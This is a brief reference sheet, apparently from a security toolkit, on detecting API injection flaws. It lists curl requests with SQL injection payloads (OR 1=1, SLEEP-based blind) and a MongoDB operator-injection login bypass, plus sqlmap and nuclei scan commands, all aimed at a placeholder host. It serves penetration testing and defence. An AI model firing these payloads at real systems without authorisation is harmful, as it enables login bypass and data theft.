<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->
# API Reference — Detecting API Injection Attacks

## curl — SQL Injection
```bash
# JSON body SQLi
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR 1=1--","password":"x"}' \
  https://target.com/api/login

# Time-based blind SQLi
curl -s -o /dev/null -w "%{time_total}" \
  "https://target.com/api/users?id=1'+AND+SLEEP(5)--"
```

## sqlmap — Automated SQL Injection
```bash
# Test query parameter
sqlmap -u "https://target.com/api/users?id=1" \
  --headers="Authorization: Bearer $TOKEN" --level=3 --risk=2 --batch

# Test JSON body
sqlmap -u "https://target.com/api/search" \
  --data='{"query":"test"}' \
  --headers="Content-Type: application/json" --batch
```

## curl — NoSQL Injection
```bash
# MongoDB operator injection
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}' \
  https://target.com/api/login
```

## nuclei — Injection Detection
```bash
nuclei -u https://target.com -t http/vulnerabilities/sqli/ -severity critical,high
nuclei -u https://target.com -t http/vulnerabilities/command-injection.yaml
nuclei -u https://target.com -t http/vulnerabilities/ssti/ -severity high
```
